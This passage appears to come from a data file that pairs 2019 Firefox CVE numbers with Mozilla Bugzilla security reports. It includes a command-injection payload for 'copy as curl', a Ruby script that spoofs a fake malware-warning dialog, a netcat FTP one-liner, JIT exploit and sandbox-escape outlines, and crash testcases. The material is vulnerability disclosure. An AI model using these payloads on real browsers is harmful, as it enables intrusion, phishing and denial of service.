than the size of the above data buffer. > { > if (NS_WARN_IF(!mDivertingFromChild)) { > MOZ_ASSERT(mDivertingFromChild, > \"Cannot RecvDivertOnDataAvailable if diverting is not set!\"); > FailDiversion(NS_ERROR_UNEXPECTED); > return IPC_FAIL_NO_REASON(this); > } > > // Drop OnDataAvailables if the parent was canceled already. > if (NS_FAILED(mStatus)) { > return IPC_OK(); > } > > mEventQ->RunOrEnqueue(new FTPDivertDataAvailableEvent(this, data, offset, > count)); > return IPC_OK(); > } The FTPDivertDataAvailableEvent event will in turn call FTPChannelParent::DivertOnDataAvailable which will create an new nsIInputStream to represent the data buffer to process. This stream can have an arbitrary length value supplied by the attacker. If the length value is greater than the data buffer supplied by the attacker, then the adjacent contents of memory can be read from when OnDataAvailable processes the stream. > void > FTPChannelParent::DivertOnDataAvailable(const nsCString& data, > const uint64_t& offset, > const uint32_t& count) > { > LOG((\"FTPChannelParent::DivertOnDataAvailable [this=%p]\\n\", this)); > > if (NS_WARN_IF(!mDivertingFromChild)) { > MOZ_ASSERT(mDivertingFromChild, > \"Cannot DivertOnDataAvailable if diverting is not set!\"); > FailDiversion(NS_ERROR_UNEXPECTED); > return; > } > > // Drop OnDataAvailables if the parent was canceled already. > if (NS_FAILED(mStatus)) { > return; > } > > nsCOMPtr<nsIInputStream> stringStream; > nsresult rv = NS_NewByteInputStream(getter_AddRefs(stringStream), data.get(), // <-- a pointer to the start or the data bufffer > count, NS_ASSIGNMENT_DEPEND); // <-- the count value which may be > then the size of the data buffer > if (NS_FAILED(rv)) { > if (mChannel) { > mChannel->Cancel(rv); > } > mStatus = rv; > return; > } > > AutoEventEnqueuer ensureSerialDispatch(mEventQ); > > rv = OnDataAvailable(mChannel, nullptr, stringStream, offset, count); // <-- continue to process the data and download it to disk. > > stringStream->Close(); > if (NS_FAILED(rv)) { > if (mChannel) { > mChannel->Cancel(rv); > } > mStatus = rv; > } > } Firefox's default action is to present the user with a dialog to either open or save the file. However in the background the contents of the file will be downloaded to a temp directory with no user interaction required. For example on a Win10 machine I get a file like \"C:\\Users\\stephen\\AppData\\Local\\Temp\\qfamDcQE.zip.part\". This location will obviously be different across OS platforms which may effect how easily an attacker can read it back depending on the sandbox implementation for that OS. If an attacker can read this files contents - * They would need read permission explicitly for this file and then either discover or brute force the 'qfamDcQE' part of the file name. * They would need read permissions on the temp directory. Then discovering the file name to read should be trivial as directory enumeration API access should be allowed (e.g FindFirstfile/FindNextFile on Windows). The attacker can now leak out memory from the Chrome process. This could be leveraged by an attacker to either bypass ASLR for an additional memory corruption based sandbox escape exploit, or to try and leak out sensitive contents from the Chrome process (Perhaps session keys or similar). To reproduce this issue: * Visit ftp://speedtest.tele2.net/ in a content process. * Optional: Run a tool like procmon.exe to monitor firefox.exe file access if you want to see the .zip.part file being written. * Attach WinDbg to this content process. * Break into WinDbg and set a breakpoint via the command \"bp xul!mozilla::net::PFTPChannelChild::SendDivertOnDataAvailable\". Now continue execution of the process. * Click a file to download, for example ftp://speedtest.tele2.net/1KB.zip which is 1024 (0x400) bytes in size. * WinDbg will break in SendDivertOnDataAvailable. We now simulate a compromised content process. Using the WinDbg Locals window, edit the count value from 0x400 to something larger like 0x1400. Now press F5 to continue execution. * Firefox will display a save/open dialog, you can ignore this. * The \"XXXXXXXX.zip.part\" file will automatically be written to disk in the background by the Chrome process. It will be written to your AppData\\Local\\Temp\\ directory. Inspecting this file will show the file size is 0x1400 and at offset 0x400 (the original file size) are 0x1000 bytes of the Chrome processes memory which was adjacent to the original data buffer from the original FTPChannelParent::RecvDivertOnDataAvailable call. * Note: There is a chance the Chrome process will read into unallocated memory and access violate. The attacker would need to perform some form of heap massaging in order to influence the layout of the heap and ensure this doesn't happen and that they leak some thing interesting."
      }
    ],
    "CVE-2019-9804": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1518026",
        "title": "RCE via \"copy as curl\" on mac",
        "description": "VULNERABILITY DETAILS Copypasting of curl requests from Firefox can produce RCE in MacOS. For example we have such JS code: fetch('https://google.com', {'body':'\\'!ls:q:gs|ls|;ping 8.8.8.8;|', method:'POST'}) If we will copy it as curl we will get such bash command: curl 'https://google.com/' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko/20100101 Firefox/64.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'content-type: text/plain;charset=UTF-8' -H 'origin: null' -H 'DNT: 1' -H 'Connection: keep-alive' --data $'\\'!ls:q:gs|ls|;ping 8.8.8.8;|' The interesting part is here: $'\\'!ls:q:gs|ls|;ping 8.8.8.8;|' It is calling following command: ping 8.8.8.8 But how? The problem that mac uses old bash, and there is lack of some updates. And current mac version of bash has a problem with bash history expansions. Our bash command will be actually interpreted interesting if some of our previous commands contained 'ls'. So we will have such request: curl 'https://google.com/' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko/20100101 Firefox/64.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'content-type: text/plain;charset=UTF-8' -H 'origin: null' -H 'DNT: 1' -H 'Connection: keep-alive' --data $'\\'';ping 8.8.8.8;'' Interesting part is here: $'\\'';ping 8.8.8.8;'' So you see that here our string transformed into executable bash code. WHATS HAPPEN First of all when I found this, I asked to fix it bash team, but they told me that it is not a vulnerability at all, so there is no CVE, and that it is fixed in newer bash (it is true), and they won't fix it for old versions. Okay, I sent this information to Apple, and they fixed it... But I was slow and didn't check there fix. But later I checked fix. And the fix was strange... They fixed Safari inspector. So it looks like Apple actually doesn't think that it is a problem in Bash as I inderstand. So I am sending report to Firefox team. VERSION Works only in MacOS in any version of Firefox. REPRODUCTION CASE I attached archieve with video showcase and HTML file."
      }
    ],
    "CVE-2019-9806": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1525267",
        "title": "FTP triggers undismissable auth prompts",
        "description": "[Affected versions]: 67.0a1 (2019-02-04) 66.0b5 (20190204181317) 65.0 (20190124174741) [Affected platforms]: Windows 10 x64 [Steps to reproduce]: Setup a simple FTP server Use the following test case Access the above test case via FTP server [Expected result]: The auth prompt should not be displayed once more. [Actual result]: Auth prompt is successively displayed, without any means to be dismissed. [Regression range]: Not a regression, I can see this issue way back to Fx 31.0a1. [Additional Notes]: Firefox can’t be escaped, only by ending its process. This behavior is not reproducible on Chrome. In order to create the FTP server, I used FileZilla."
      }
    ],
    "CVE-2019-9807": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1362050",
        "title": "FTP allows window modal alert box with attacker controlled input",
        "description": "When one sends garbage over the ftp port 21 and tries to access it via firefox + then tries to reload it will create an alert box with the garbage as content. I'm attaching a poc. Use it by first starting a dummy \"garbage ftp server\" on localhost with netcat: while true; do echo \"I can control your popup window content\" | nc -l -p 21; done And then open the html file. I don't see why this behavior makes any sense. It seems some kind of error handling, however it's missing any explaining error message and just puts all content that came over the ftp port in an alert box. It allows bypassing restrictions of window modal alert boxes, which usually webpages shouldn't be able to control."
      }
    ],
    "CVE-2019-9809": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1523249",
        "title": "FTP can open endless number of blocking popups, making Firefox unusable",
        "description": "FTP login and error popups are blocking (i.e. make the main window unusable). By causing a lot of FTP popups a site can practically make the browser unusable. I'll attach a video showing how this looks. This is a simple setup with an FTP server allowing anoynmous login (I use proftpd, every one should do) and an HTML file containing lots of img tags loading images from an invalid directory. I create the HTML with this: for i in $(seq 1 10000); do echo \"<img src='../$i/$i.png'>\"; done In this example I get a mixture of directory errors and login fields. I don't know exactly why the login fields show up, I guess the FTP server reacts somehow to being overloaded with requests. There's no other option than killing the browser to escape such a situation. It's \"only a DoS\", but a pretty annoying one. (Ceterum Censeo FTP esse delendam.)"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1282430",
        "title": "cross-domain 'alert-style' modal dialog spoof using ftp even from e.g. img requests in web forums or the like",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/50.0.2661.102 Chrome/50.0.2661.102 Safari/537.36 Steps to reproduce: tested with (system base): windows, linux tested with (version): mozilla firefox 43.0.2, 47.0 proof of concept: 1. (browser) open a ftp connection using ftp-link on img-tag or anything: <img src='ftp://username:password@server/test.png'> 2. (browser) send wrong login credentials. 3. (server) 4. (server) break connection by server side and send a fake message. screenshot: http://fs5.directupload.net/images/160105/u7mlcf54.jpg test-exploit (ruby): require 'timeout' require 'socket' #---conf--- addr='127.0.0.1' #serverip port=21 #serverport $sleeper=0.3 #wait before broke connection $threads=30 #concurrent connections $killcom='k1llm3' #kill server by command $msgbox=\"ACHTUNG: Diese Website enth\\xE4lt Malware!\\x0A\\x0ASelbst wenn der Besuch dieser Website bisher sicher war,\\x0Abesteht nun die Gefahr, dass Sie Ihren Computer mit Malware\\x0Ainfizieren\\x0A\\x0A***Malware ist Schadsoftware, die unter anderem zu\\x0AIdentit\\xE4tsdiebstahl, finanziellen Verlusten und zum dauerhaften\\x0AL\\xF6schen von Dateien f\\xFChren kann.***\\x0A\\x0ABITTE VERLASSEN SIE DIESE WEBSITE UMGEHEND!\\x0A\\x0A*---Ihr Mozilla Firefox-Team\" #---------- $msga=\"220 Speak friend, and enter\\r\\n\"; $msgb=\"331 FTP login okay, send password.\\r\\n\"; $server=TCPServer.open(addr, port) def main(client) while 1 sleep 0.000001 while client=='x' sleep 0.000001; client=$server.accept; puts \"(\"+Time.at(Time.now.to_i).to_s+\") \"+client.peeraddr[3] end begin complete_results=Timeout.timeout(5) do sleep $sleeper; client.send($msga, 0); linei=0 while line=client.gets if line==$killcom+\"\\r\\n\" or line==$killcom+\"\\n\" exit end sleep 0.000001 client.send($msgb+$msgbox+\"\\r\\n\", 0); sleep $sleeper; client.close; client='x'; break end end rescue Timeout::Error end end end i=1 while i<$threads Thread.new{main('x')} i+=1 end Thread.new{main('x')}.join Actual results: screenshot: http://fs5.directupload.net/images/160105/u7mlcf54.jpg by using this exploit/this way: firefox will not say what kind of error show this message. the user only see a message directly from firefox. attackers can foist this object each where include img-tags or anything like forums, blog-comments, etc... Expected results: it's a fine way to spreading trojans and spoofing security messages on friendly websites."
      }
    ],
    "CVE-2019-9810": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1537924",
        "title": "ZDI-CAN-8368 IonMonkey MArraySlice has incorrect alias information",
        "description": "pwn2own 2019 Here is the JIT implementation of Array.slice: CompilerObject templateObj_; gc::InitialHeap initialHeap_; MArraySlice(MDefinition* obj, MDefinition* begin, MDefinition* end, JSObject* templateObj, gc::InitialHeap initialHeap) : MTernaryInstruction(classOpcode, obj, begin, end), templateObj_(templateObj), initialHeap_(initialHeap) { setResultType(MIRType::Object); } public: INSTRUCTION_HEADER(ArraySlice) TRIVIAL_NEW_WRAPPERS NAMED_OPERANDS((0, object), (1, begin), (2, end)) JSObject* templateObj() const { return templateObj_; } gc::InitialHeap initialHeap() const { return initialHeap_; } AliasSet getAliasSet() const override { return AliasSet::Store(AliasSet::Element | AliasSet::ObjectFields); } bool possiblyCalls() const override { return true; } bool appendRoots(MRootList& roots) const override { return roots.append(templateObj_); } This states that Array.sice does not have side effects, but actually they can be triggered via Symbol.species. We execute JS that shortens the Array to cause OOB writes later on. We spray TypedArrays and overwrite a length to gain arb r/w. We then ROP to execute our shellcode."
      }
    ],
    "CVE-2019-9812": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1538008",
        "title": "[ ZDI-CAN-8375] UXSS priv-esc via sync (install arbitrary extensions & set arbitrary preferences)",
        "description": "UXSS -> privesc via sync (install arbitrary extensions & set arbitrary preferences) RCE in the Firefox renderer can be turned into UXSS via renderer patches (see my Pwn2Own exploit). Now login in to sync via UXSS on https://accounts.firefox.com/signin?service=sync&context=fx_desktop_v3&entrypoint=menupanel (this can probably be achieved via XPCOM but this is the easiest way to do it). This lets you sync the victim browser with an attacker-controlled account, leading immediately to: Privesc to web extension Arbitrary preference write by setting services.sync.prefs.sync.<pref> = true On Linux: security.sandbox.content.level = 0 -> Boom, no sandbox! (on Windows + macOS we are capped at 1, but we can at least bypass the desktop & job lockdown) browser.tabs.remote.autostart -> turning this off disables e10s, but only after a restart browser.download.{dir,useDownloadDir} -> probably arbitrary file write, have not tested this network.proxy.autoconfig_url = <path to PAC file>, network.proxy.type = 2, This script will be evaluated in browser process, so we can chain with a Spidermonkey exploit (such as the one I used at Pwn2Own) I'm sure there is other interesting settings which lead to a full sandbox escape."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1538015",
        "title": "Revisit pref sync in to mitigate sandbox escape vector",
        "description": "In light of bug 1538008 we should re-think the way we sync preferences. See bug 1538008 for more details."
      }
    ],
    "CVE-2019-9814": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1527592%2C1534536%2C1520132%2C1543159%2C1539393%2C1459932%2C1459182%2C1516425",
        "description": "In light of bug 1538008 we should re-think the way we sync preferences. See bug 1538008 for more details."
      }
    ],
    "CVE-2019-9819": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1532553",
        "title": "Compartment mismatch in APIUnwrapAndDowncast<js::ReadableStream>",
        "description": "The following testcase crashes the latest ASAN build of Firefox 67.0a1 (SourceStamp=c59f0f40e0f6995c2bf70499e783afc7626cab96). It requires to be served from a localhost http server. crash.html: <script> function start() { o16=window.open('data:image/svg%2bxml,%3Csvg%3e'); o304=o16.caches; o305=o304.open('c2'); o305.then(fun0); } function fun0(o340) { o663=new Response('x'); o663.body; o841=new Request('x'); o340.put(o841,o663); } </script> <body onload=\"start()\"></body> ASAN output: AddressSanitizer:DEADLYSIGNAL ==24009==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000001 (pc 0x563e39c30581 bp 0x7ffe45414eb0 sp 0x7ffe45414eb0 T0) ==24009==The signal is caused by a WRITE memory access. ==24009==Hint: address points to the zero page. #0 0x563e39c30580 in MOZ_Crash(char const*, int, char const*) /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/Assertions.h:314:3 #1 0x563e39c3048d in MOZ_CrashPrintf /builds/worker/workspace/build/src/mfbt/Assertions.cpp:55:3 #2 0x7f0e211519ae in fail /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:43:5 #3 0x7f0e211519ae in check /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:59 #4 0x7f0e211519ae in check /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:73 #5 0x7f0e211519ae in checkImpl<JSObject > /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:184 #6 0x7f0e211519ae in check<JSObject > /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:192 #7 0x7f0e211519ae in APIUnwrapAndDowncast<js::ReadableStream> /builds/worker/workspace/build/src/js/src/builtin/Stream.cpp:4495 #8 0x7f0e211519ae in JS::ReadableStreamGetMode(JSContext, JS::Handle<JSObject>, JS::ReadableStreamMode*) /builds/worker/workspace/build/src/js/src/builtin/Stream.cpp:4558 #9 0x7f0e19c9c964 in mozilla::dom::FetchBody<mozilla::dom::Response>::SetBodyUsed(JSContext*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/fetch/Fetch.cpp:1072:10 #10 0x7f0e19477747 in mozilla::dom::cache::TypeUtils::ToCacheResponse(JSContext*, mozilla::dom::cache::CacheResponse&, mozilla::dom::Response&, nsTArray<mozilla::UniquePtr<mozilla::ipc::AutoIPCStream, mozilla::DefaultDelete<mozilla::ipc::AutoIPCStream> > >&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/cache/TypeUtils.cpp:225:9 #11 0x7f0e193db496 in mozilla::dom::cache::AutoChildOpArgs::Add(JSContext*, mozilla::dom::InternalRequest*, mozilla::dom::cache::TypeUtils::BodyAction, mozilla::dom::cache::TypeUtils::SchemeAction, mozilla::dom::Response&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/cache/AutoUtils.cpp:306:21 #12 0x7f0e193e6d6f in mozilla::dom::cache::Cache::Put(JSContext*, mozilla::dom::RequestOrUSVString const&, mozilla::dom::Response&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/cache/Cache.cpp:420:8 #13 0x7f0e17af708c in put /builds/worker/workspace/build/src/obj-firefox/dom/bindings/CacheBinding.cpp:915:45 #14 0x7f0e17af708c in mozilla::dom::Cache_Binding::put_promiseWrapper(JSContext*, JS::Handle<JSObject*>, mozilla::dom::cache::Cache*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/CacheBinding.cpp:931 #15 0x7f0e19388255 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ConvertExceptionsToPromises>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3144:13 #16 0x7f0e209e6f97 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:440:13 #17 0x7f0e209e6f97 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:532 #18 0x7f0e209e9552 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:603:8 #19 0x7f0e216a35e1 in js::ForwardingProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:162:10 #20 0x7f0e2165c4b1 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:238:19 #21 0x7f0e21681d90 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:503:19 #22 0x7f0e209e7fe9 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:506:14 #23 0x7f0e209ced3f in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:591:10 #24 0x7f0e209ced3f in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3055 #25 0x7f0e209b19b8 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:420:10 #26 0x7f0e209e7906 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:560:13 #27 0x7f0e209e9552 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:603:8 #28 0x7f0e216a35e1 in js::ForwardingProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:162:10 #29 0x7f0e2165c4b1 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:238:19 #30 0x7f0e21681d90 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:503:19 #31 0x7f0e209e7fe9 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:506:14 #32 0x7f0e209e9552 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:603:8 #33 0x7f0e20b9ba61 in Call /builds/worker/workspace/build/src/js/src/vm/Interpreter.h:98:10 #34 0x7f0e20b9ba61 in PromiseReactionJob(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/src/builtin/Promise.cpp:1660 #35 0x7f0e209e6f97 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:440:13 #36 0x7f0e209e6f97 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:532 #37 0x7f0e209e9552 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:603:8 #38 0x7f0e215cbe56 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2623:10 #39 0x7f0e171ef37c in mozilla::dom::PromiseJobCallback::Call(JSContext*, JS::Handle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/PromiseBinding.cpp:26:8 #40 0x7f0e11a5222f in Call /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/PromiseBinding.h:91:12 #41 0x7f0e11a5222f in Call /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/PromiseBinding.h:104 #42 0x7f0e11a5222f in mozilla::PromiseJobRunnable::Run(mozilla::AutoSlowOperation&) /builds/worker/workspace/build/src/xpcom/base/CycleCollectedJSContext.cpp:235 #43 0x7f0e11a2388e in mozilla::CycleCollectedJSContext::PerformMicroTaskCheckPoint(bool) /builds/worker/workspace/build/src/xpcom/base/CycleCollectedJSContext.cpp:595:17 #44 0x7f0e11a2442a in mozilla::CycleCollectedJSContext::AfterProcessTask(unsigned int) /builds/worker/workspace/build/src/xpcom/base/CycleCollectedJSContext.cpp:437:3 #45 0x7f0e14040b75 in XPCJSContext::AfterProcessTask(unsigned int) /builds/worker/workspace/build/src/js/xpconnect/src/XPCJSContext.cpp:1261:28 #46 0x7f0e11cb501f in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1226:24 #47 0x7f0e11cbbfbd in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:482:10 #48 0x7f0e12f38b7f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:88:21 #49 0x7f0e12e2032e in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #50 0x7f0e12e2032e in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #51 0x7f0e12e2032e in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #52 0x7f0e1c1cca13 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27 #53 0x7f0e2070586e in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:911:20 #54 0x7f0e12e2032e in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #55 0x7f0e12e2032e in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #56 0x7f0e12e2032e in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #57 0x7f0e207049c3 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:749:34 #58 0x563e39bbc874 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:49:28 #59 0x563e39bbc874 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:265 #60 0x7f0e35594b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 #61 0x563e39ae1efc in _start (/home/nils/browser/firefox/firefox/firefox+0x2defc) AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/Assertions.h:314:3 in MOZ_Crash(char const*, int, char const*) ==24009==ABORTING"
      }
    ],
    "CVE-2019-9820": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1536405",
        "title": "heap-use-after-free in nsDocShell::GetChromeEventHandler",
        "description": "The following testcase crashes the latest ASAN build of Firefox 68.0a1 (SourceStamp=8803315158232628b5a63ad1e2dc84b28da805eb). It requires the attached intro.xml and intro.xsl in the same directory loaded from a webserver. It works best if loaded in multiple tabs and might require a few attempts. crash.html: <script> function start() { o1044=document.createElementNS('http://www.w3.org/1999/xhtml','form'); o10=window.open('intro.xml','popup39','height=10,width=105,top=1,outerWidth=121,innerHeight=-393216,innerWidth=7602173,dependent');; o44=window.open('y','popup80','centerscreen,innerWidth=3,menubar,scrollbars');; document.documentElement.innerHTML=''; o554=document.documentElement; o10.F={};o10.eval(\"F.o622=document.createElementNS('http://www.w3.org/1999/xhtml','div');\");; o622 = o10.F.o622; o622.innerHTML=\"<svg><title xml=\"test-title\"></title><defs><font-face></font-face></defs><g font-family=\"test-body-content\"><text>end</text><g transform=\"translate\"><g font-size=\"14\"><g><rect width=\"-6\"></rect>><rect fill=\"\"></rect></g></g></g><text>DRAFT</text></g></svg>\"; o623=o622.firstChild.getElementsByTagName('*');; o637=o623[1];; o693=new IntersectionObserver(fun0,{});; o716=o637.ownerDocument;; o693.observe(o554); o10.open(); o10.close(); o907 = o10.document; o907.documentElement.appendChild(o1044); try{o716.appendChild(o907.documentElement);}catch(e){} } function fun0() { o1114=document.createElementNS('http://www.w3.org/1999/xhtml','iframe');; o1044.appendChild(o1114); } </script> <body onload=\"start()\"></body> ASAN output: ==24153==ERROR: AddressSanitizer: heap-use-after-free on address 0x60c000209b00 at pc 0x7fbcedd8c7d8 bp 0x7ffe33fc6480 sp 0x7ffe33fc6478 READ of size 8 at 0x60c000209b00 thread T0 (Web Content) #0 0x7fbcedd8c7d7 in nsCOMPtr /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:517:7 #1 0x7fbcedd8c7d7 in nsDocShell::GetChromeEventHandler(mozilla::dom::EventTarget**) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:1148 #2 0x7fbce47179de in nsFrameLoader::MaybeCreateDocShell() /builds/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:2011:21 #3 0x7fbce471bbfd in nsFrameLoader::CheckForRecursiveLoad(nsIURI*) /builds/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:2249:8 #4 0x7fbce470f1ed in CheckURILoad /builds/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:575:10 #5 0x7fbce470f1ed in nsFrameLoader::LoadURI(nsIURI*, nsIPrincipal*, nsIContentSecurityPolicy*, bool) /builds/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:373 #6 0x7fbce470dfd3 in nsFrameLoader::LoadFrame(bool) /builds/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:339:10 #7 0x7fbce859e48e in LoadSrc /builds/worker/workspace/build/src/dom/html/nsGenericHTMLFrameElement.cpp:201:17 #8 0x7fbce859e48e in nsGenericHTMLFrameElement::BindToTree(mozilla::dom::Document*, nsIContent*, nsIContent*) /builds/worker/workspace/build/src/dom/html/nsGenericHTMLFrameElement.cpp:218 #9 0x7fbce838c2fc in mozilla::dom::HTMLIFrameElement::BindToTree(mozilla::dom::Document*, nsIContent*, nsIContent*) /builds/worker/workspace/build/src/dom/html/HTMLIFrameElement.cpp:67:34 #10 0x7fbce4767759 in nsINode::InsertChildBefore(nsIContent*, nsIContent*, bool) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1246:23 #11 0x7fbce4772e24 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:2361:14 #12 0x7fbce53b00b9 in InsertBefore /builds/worker/workspace/build/src/obj-firefox/dist/include/nsINode.h:1684:12 #13 0x7fbce53b00b9 in AppendChild /builds/worker/workspace/build/src/obj-firefox/dist/include/nsINode.h:1687 #14 0x7fbce53b00b9 in mozilla::dom::Node_Binding::appendChild(JSContext*, JS::Handle<JSObject*>, nsINode*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/NodeBinding.cpp:1021 #15 0x7fbce780d8f1 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3144:13 #16 0x7fbceef3cd77 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13 #17 0x7fbceef3cd77 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534 #18 0x7fbceef3f332 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:605:8 #19 